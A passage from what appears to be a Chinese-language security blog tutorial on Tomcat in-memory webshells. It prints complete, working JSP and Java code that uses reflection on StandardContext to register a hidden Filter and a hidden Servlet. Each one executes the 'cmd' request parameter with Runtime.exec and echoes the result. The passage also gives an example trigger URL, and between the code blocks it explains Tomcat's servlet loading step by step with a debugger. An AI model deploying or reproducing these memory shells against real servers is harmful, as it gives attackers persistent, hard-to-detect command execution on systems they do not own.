class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>                            Scanner s = <span class="hljs-keyword">new</span> Scanner(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                            String output = s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                            servletResponse.getWriter().write(output);<br>                            <span class="hljs-keyword">return</span>;<br>                        &#125;<br>                        filterChain.doFilter(servletRequest,servletResponse);<br>                    &#125;<br><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>                    &#125;<br>                &#125;;<br><br>                <span class="hljs-comment">//反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加</span><br>                Class&lt;?&gt; FilterDef = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);<br>                <span class="hljs-comment">//获取FilterDef构造方法</span><br>                Constructor declaredConstructors = FilterDef.getDeclaredConstructor();<br>                <span class="hljs-comment">//实例化一个对象</span><br>                FilterDef o = (FilterDef)declaredConstructors.newInstance();<br>                o.setFilter(filter); <span class="hljs-comment">//设置filter</span><br>                o.setFilterName(FilterName); <span class="hljs-comment">//设置filter的名字</span><br>                o.setFilterClass(filter.getClass().getName()); <span class="hljs-comment">//设置filter的类</span><br>                standardContext.addFilterDef(o); <span class="hljs-comment">//在standardContext中加一个FilterDef</span><br><br>                <span class="hljs-comment">//反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去</span><br>                Class&lt;?&gt; FilterMap = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);<br>                Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();<br>                FilterMap o1 = (FilterMap)declaredConstructor.newInstance(); <span class="hljs-comment">//生成filtermap的实例</span><br><br>                o1.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>); <span class="hljs-comment">// 设置匹配的url路径，这里是任意路径</span><br>                o1.setFilterName(FilterName); <span class="hljs-comment">//设置路径匹配的filter</span><br>                o1.setDispatcher(DispatcherType.REQUEST.name());<br>                standardContext.addFilterMapBefore(o1); <span class="hljs-comment">//添加一个filtermap到standardContext中</span><br><br>                <span class="hljs-comment">//反射获取ApplicationFilterConfig，构造方法FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去</span><br>                Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);<br>                Constructor&lt;?&gt; declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);<br>                declaredConstructor1.setAccessible(<span class="hljs-keyword">true</span>);<br>                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);<span class="hljs-comment">//生成ApplicationFilterConfig类型的值，等待被添加到filterconfig列表中，filterconfig中的内容都是ApplicationFilterConfig格式的</span><br>                filterConfigs.put(FilterName,filterConfig); <span class="hljs-comment">//将新的filterconfig添加到filterconfig列表里面。</span><br>                response.getWriter().write(<span class="hljs-string">&quot;Success&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<p>JSP马</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br><br>&lt;%<br>    Field Configs = <span class="hljs-keyword">null</span>;<br>    Map filterConfigs;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//这里是反射获取ApplicationContextFacade</span><br>        ServletContext servletContext = request.getSession().getServletContext();<br>        <span class="hljs-comment">//获取context也就是ApplicationContext</span><br>        Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appctx.setAccessible(<span class="hljs-keyword">true</span>); <span class="hljs-comment">//忽略权限控制检查，获取很高的代码执行权限</span><br>        <span class="hljs-comment">//返回指定对象obj上此 Field 表示的字段的值也就是返回指定对象servletContext上此context表示的字段的值</span><br>        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br>        <span class="hljs-comment">//获取到ApplicationContext下的context字段也就是StandardContext</span><br>        Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">//返回指定对象servletContext上此context表示的字段的值，也就是StandardContext对象</span><br>        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br><br>        <span class="hljs-comment">//获取filterConfigs</span><br>        String FilterName = <span class="hljs-string">&quot;cmd_Filter&quot;</span>;<br>        Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>        Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">//返回standardContext对象的filterConfigs</span><br>        filterConfigs = (Map) Configs.get(standardContext);<br><br>        <span class="hljs-keyword">if</span> (filterConfigs.get(FilterName) == <span class="hljs-keyword">null</span>) &#123;<br>            Filter filter = <span class="hljs-keyword">new</span> Filter() &#123;<br><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>                    HttpServletRequest req = (HttpServletRequest) servletRequest;<br>                    <span class="hljs-comment">//获取参数，执行并且回显</span><br>                    <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br>                        InputStream in = Runtime.getRuntime().exec(req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>                        Scanner s = <span class="hljs-keyword">new</span> Scanner(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                        String output = s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                        servletResponse.getWriter().write(output);<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    filterChain.doFilter(servletRequest,servletResponse);<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>                &#125;<br>            &#125;;<br><br>            <span class="hljs-comment">//反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加</span><br>            Class&lt;?&gt; FilterDef = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);<br>            <span class="hljs-comment">//获取FilterDef构造方法</span><br>            Constructor declaredConstructors = FilterDef.getDeclaredConstructor();<br>            <span class="hljs-comment">//实例化一个对象</span><br>            FilterDef o = (FilterDef)declaredConstructors.newInstance();<br>            o.setFilter(filter); <span class="hljs-comment">//设置filter</span><br>            o.setFilterName(FilterName); <span class="hljs-comment">//设置filter的名字</span><br>            o.setFilterClass(filter.getClass().getName()); <span class="hljs-comment">//设置filter的类</span><br>            standardContext.addFilterDef(o); <span class="hljs-comment">//在standardContext中加一个FilterDef</span><br><br>            <span class="hljs-comment">//反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去</span><br>            Class&lt;?&gt; FilterMap = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);<br>            Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();<br>            FilterMap o1 = (FilterMap)declaredConstructor.newInstance(); <span class="hljs-comment">//生成filtermap的实例</span><br><br>            o1.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>); <span class="hljs-comment">// 设置匹配的url路径，这里是任意路径</span><br>            o1.setFilterName(FilterName); <span class="hljs-comment">//设置路径匹配的filter</span><br>            o1.setDispatcher(DispatcherType.REQUEST.name());<br>            standardContext.addFilterMapBefore(o1); <span class="hljs-comment">//添加一个filtermap到standardContext中</span><br><br>            <span class="hljs-comment">//反射获取ApplicationFilterConfig，构造方法FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去</span><br>            Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);<br>            Constructor&lt;?&gt; declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);<br>            declaredConstructor1.setAccessible(<span class="hljs-keyword">true</span>);<br>            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);<span class="hljs-comment">//生成ApplicationFilterConfig类型的值，等待被添加到filterconfig列表中，filterconfig中的内容都是ApplicationFilterConfig格式的</span><br>            filterConfigs.put(FilterName,filterConfig); <span class="hljs-comment">//将新的filterconfig添加到filterconfig列表里面。</span><br>            response.getWriter().write(<span class="hljs-string">&quot;Success&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<p>tomcat-filter内存马需要在tomcat7+以上才能注入成功，原因是 <code>javax.servlet.DispatcherType</code> 类(shell.jsp中用到)是Servlet3以后才引入的，而且在 tomcat7+才支持 Servlet3！</p>
</br>

<h2 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h2><p>Tomcat其实是Web服务器和Servlet容器的结合体。 </p>
<p>Web服务器：通俗来讲就是将某台主机的资源文件映射成URL供给外界访问。（比如访问某台电脑上的图片文件）</p>
<p>Servlet容器：顾名思义就是存放Servlet对象的东西，Servlet主要作用是处理URL请求。（接受请求、处理请求、响应请求）</p>
</br>

<p>编写一个service Demo，方便我们后面调试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sec.servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-meta">@WebServlet(&quot;/servicedemo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServiceDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Servlet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title">getServletConfig</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Servlet启动...&quot;</span>);<br>        String cmd = servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        PrintWriter writer = servletResponse.getWriter();<br>        writer.write(cmd);<br>        writer.flush();<br>        writer.close();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getServletInfo</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409100105.png"></p>
</br>

<h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servlet接口类有五个接口，分别是init（Servlet对象初始化时调用）、getServletConfig（获取web.xml中Servlet对应的init-param属性）、service（每次处理新的请求时调用）、getServletInfo（返回Servlet的配置信息，可自定义实现）、destroy（结束时调用）：</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409212739.png"></p>
</br>

<h3 id="注入Servlet"><a href="#注入Servlet" class="headerlink" title="注入Servlet"></a>注入Servlet</h3><p>Servlet 的生命周期开始于Web容器的启动时（解析加载web.xml配置的servlet对象），它就会被载入到Web容器内存中，直到Web容器停止运行或者重新装入servlet时候结束。这里也就是说，一旦Servlet被装入到Web容器之后，一般是会长久驻留在Web容器之中。</p>
<p>在StandardContext中提供了动态添加Servlet类的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Dynamic <span class="hljs-title">addServlet</span><span class="hljs-params">(String servletName, String className)</span> </span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UnsupportedOperationException(ContainerBase.sm.getString(<span class="hljs-string">&quot;noPluggabilityServletContext.notAllowed&quot;</span>));<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Dynamic <span class="hljs-title">addServlet</span><span class="hljs-params">(String servletName, Servlet servlet)</span> </span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UnsupportedOperationException(ContainerBase.sm.getString(<span class="hljs-string">&quot;noPluggabilityServletContext.notAllowed&quot;</span>));<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Dynamic <span class="hljs-title">addServlet</span><span class="hljs-params">(String servletName, Class&lt;? extends Servlet&gt; servletClass)</span> </span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UnsupportedOperationException(ContainerBase.sm.getString(<span class="hljs-string">&quot;noPluggabilityServletContext.notAllowed&quot;</span>));<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>我们从前面可知，Wrapper代表（负责管理）一个Servlet，而Context中包含了一个或多个Warpper（即Servlet）。</p>
</br>

<h3 id="Servlet生成与配置"><a href="#Servlet生成与配置" class="headerlink" title="Servlet生成与配置"></a>Servlet生成与配置</h3><p>首先我们就要创建一个Wapper实例，StandardContext.createWapper()获得一个Wapper对象</p>
<p>Context 负责管理 Wapper ，而 Wapper 又负责管理 Servlet 实例。当获取到StandardContext对象，就可以用 createWapper() 来生成一个 Wapper 对象</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409214941.png"></p>
<p>接下来就是配置Servlet，探究配置过程，在 org.apache.catalina.core.StandardWapper#setServletClass() 下断点，Debug运行服务</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409220453.png"></p>
<p>断点调试，回溯到configureStart，可以看到这边是调用了webConfig()</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410122729.png"></p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410101010.png"></p>
<p>我们直接往下看这里调用了configureContext方法</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410101414.png"></p>
<p>configureContext() 中依次读取了 Filter、Listener、Servlet的配置及其映射，我们直接看 Servlet 部分：</p>
<p>使用context对象的createWrapper()方法创建了Wapper对象，然后设置了启动优先级LoadOnStartUp，以及servlet的Name。</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410101642.png"></p>
<p>接着配置了Servlet的Class</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410101949.png"></p>
<p>最后将创建并配置好的 Wrapper 加入到 Context 的 Child 中。通过循环遍历所有 servlets 完成了 Servlet 从配置到添加的全过程，接下来就需要添加Servlet-Mapper了（对应web.xml中的<servlet-mapping>）</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410102044.png"></p>
<p>取出web.xml中所有配置的Servlet-Mapping，通过context.addServletMappingDecoded()将url路径和servlet类做映射。</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410102543.png"></p>
<p>跟进到addServletMappingDecoded()方法的StandardContext类中，发现addServletMappingDecoded()和addServletMapping()是一样的，只不过后者是不建议使用（某些低版本的Tomcat可以尝试使用）</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410102822.png"></p>
<p>总结下Servlet的生成和动态依次加入以下步骤：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 通过 context.createWapper() 创建 Wapper 对象；<br><br><span class="hljs-bullet">2.</span> 设置 Servlet 的 LoadOnStartUp 的值；<br><br><span class="hljs-bullet">3.</span> 设置 Servlet 的 Name；<br><br><span class="hljs-bullet">4.</span> 设置 Servlet 对应的 Class；<br><br><span class="hljs-bullet">5.</span> 将 Servlet 添加到 context 的 children 中；<br><br><span class="hljs-bullet">6.</span> 将 url 路径和 servlet 类做映射。<br></code></pre></td></tr></table></figure>

</br>

<h3 id="Servlet装载过程"><a href="#Servlet装载过程" class="headerlink" title="Servlet装载过程"></a>Servlet装载过程</h3><p>配置好一个Servlet Demo，我们要在StandardWrapper#loadServlet()位置下断点，这边是用来加载Servlet</p>
<p>回溯到StandardContext#startInternal方法下，加载完Listener和Filter之后，才能装载Servlet</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410104330.png"></p>
<p>前面已经完成了将所有 servlet 添加到 context 的 children 中，this.findChildren()即把所有Wapper（负责管理Servlet）传入loadOnStartup()中处理，可想而知loadOnStartup()就是负责动态添加Servlet的一个函数：</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410104542.png"></p>
<p>首先获取Context下所有的Wapper类，并获取到每个Servlet的启动顺序，删选出 &gt;= 0 的项加载到一个存放Wapper的list中。</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410104919.png"></p>
</br>

<p>每个Servlet的启动顺序在web.xml中<load-on-startup>声明：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Demo--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>servletDemo<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.java.Memory.ServletDemo<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>WEB-INF/dispatcher-servlet.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>servletDemo<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/servlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>如果没有声明 load-on-startup 属性（默认为-1）：</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410105839.png"></p>
<p>然后对每个wapper进行装载：</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410111626.png"></p>
<p>装载所有的 Servlet 之后，就会根据具体请求进行初始化、调用、销毁一系列操作：</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl">装载：启动服务器时加载<span class="hljs-variable">Servlet</span>的实例<br><br>初始化：<span class="hljs-variable">web</span>服务器启动时或<span class="hljs-variable">web</span>服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作有<span class="hljs-function"><span class="hljs-title">init</span>()方法负责执行完成</span><br><span class="hljs-function"></span><br><span class="hljs-function">调用：即每次调用<span class="hljs-variable">Servlet</span>的<span class="hljs-title">service</span>()，从第一次到以后的多次访问，都是只是调用<span class="hljs-title">doGet</span>()或<span class="hljs-title">doPost</span>()方法（<span class="hljs-variable">doGet</span>、<span class="hljs-variable">doPost</span>内部实现，具体参照<span class="hljs-variable">HttpServlet</span>类<span class="hljs-title">service</span>()的重写）</span><br><span class="hljs-function"></span><br><span class="hljs-function">销毁：停止服务器时调用<span class="hljs-title">destroy</span>()方法，销毁实例</span><br></code></pre></td></tr></table></figure>

</br>

<h3 id="构造Servlet内存马"><a href="#构造Servlet内存马" class="headerlink" title="构造Servlet内存马"></a>构造Servlet内存马</h3><p>首先写一个Servlet.jsp的恶意类，实现service方法：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedInputStream&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;$Title$&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>  <br>  &lt;%<br>    <span class="hljs-comment">//创建一个servlet恶意类</span><br>    HttpServlet httpServlet = <span class="hljs-keyword">new</span> HttpServlet() &#123;<br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        InputStream is = Runtime.getRuntime().exec(req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>        BufferedInputStream bis = <span class="hljs-keyword">new</span> BufferedInputStream(is);<br>        <span class="hljs-keyword">int</span> len;<br>        <span class="hljs-keyword">while</span> ((len = bis.read())!=-<span class="hljs-number">1</span>)&#123;<br>          resp.getWriter().write(len);<br>        &#125;<br>      &#125;<br><br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">super</span>.doPost(req, resp);<br>      &#125;<br>    &#125;;<br><br>    <span class="hljs-comment">//获得StandardContext</span><br>    Field reqF = request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-keyword">true</span>);<br>    Request req = (Request) reqF.get(request);<br>    StandardContext stdcontext = (StandardContext) req.getContext();<br><br>    <span class="hljs-comment">//从StandardContext.createWapper()获得一个Wapper对象</span><br>    Wrapper newWrapper = stdcontext.createWrapper();<br>    String name = httpServlet.getClass().getSimpleName();<br>    newWrapper.setName(name);<br>    newWrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>    newWrapper.setServlet(httpServlet);<br>    newWrapper.setServletClass(httpServlet.getClass().getName());<br>    <span class="hljs-comment">//将Wrapper添加到StandardContext</span><br>    stdcontext.addChild(newWrapper);<br>    stdcontext.addServletMappingDecoded(<span class="hljs-string">&quot;/demo&quot;</span>, name);<br>  %&gt;<br></code></pre></td></tr></table></figure>

<p>首先我们访问下这个servlet.jsp，再访问/demo，即可执行命令</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span>/demo?cmd=calc<br></code></pre></td></tr></table></figure>

</br>

<h2 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h2><p>编写servlet程序</p>
